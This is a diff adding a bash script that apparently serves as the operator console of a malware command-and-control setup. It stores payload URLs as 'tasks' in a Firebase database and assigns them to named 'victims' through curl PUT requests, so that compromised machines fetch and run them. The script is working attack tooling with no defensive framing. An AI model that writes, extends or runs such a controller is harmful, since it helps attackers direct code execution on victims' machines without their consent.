@@ -1,0 +1,91 @@
+#!/usr/bin/env bash
+
+source deploymentFirebaseScript.sh
+
+function usage(){
+
+  echo "config option [parameters]"
+  echo "  addTask <taskID> <taskURL>"
+  echo "  listTasks"
+  echo "  setVictimTask <victim> <taskID>"
+  echo ""
+}
+
+###############################################################################
+
+function addTask(){
+  local taskID="$1"
+  local taskURL="$2"
+
+  if [ -z "$1" ] || [ -z "$2" ]; then
+    usage
+    exit 1
+  fi
+
+  local completeTaskURL="${payloadPrefix}${taskURL}"
+  if [ ! `urlExists "$completeTaskURL"` -eq 0 ]; then
+    echo "Error: Specified task '$completeTaskURL' does not exist"
+  else
+    curl -X PUT -d "\"$taskURL\"" "https://${firebaseProject}.firebaseio.com/tasks/$taskID.json" &>/dev/null
+  fi
+}
+
+function listTasks() {
+  echo "Available tasks"
+  curl -s "https://${firebaseProject}.firebaseio.com/tasks.json" \
+   | tr ',' '\n' \
+   | tr -d '{}' \
+   | sed -e 's/^/  /'
+  echo ""
+}
+
+###############################################################################
+
+function getTaskURL() {
+  local taskID="$1"
+  local url=`curl -s "https://${firebaseProject}.firebaseio.com/tasks/$taskID.json" | tr -d '"'`
+
+  if [ "$url" == "null" ]; then
+    echo ""
+  else
+    echo $url
+  fi
+}
+
+function setVictimTask() {
+  local victim="$1"
+  local taskID="$2"
+
+  if [ -z "$1" ] || [ -z "$2" ]; then
+    usage
+    exit 1
+  fi
+
+  local taskURL="`getTaskURL $taskID`"
+  if [ -z "$taskURL" ]; then
+    echo "Error: Specified task '$taskID' does not exist"
+  else
+    curl -X PUT -d "\"$taskURL\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
+  fi
+}
+
+###############################################################################
+
+func=`echo "$1" | tr '[:upper:]' '[:lower:]'`
+
+case "$func" in
+  setvictimtask)
+    setVictimTask "$2" "$3"
+    ;;
+  addtask)
+    addTask "$2" "$3"
+    ;;
+  listtasks)
+    listTasks
+    ;;
+  *)
+    usage
+    ;;
+esac
+
+
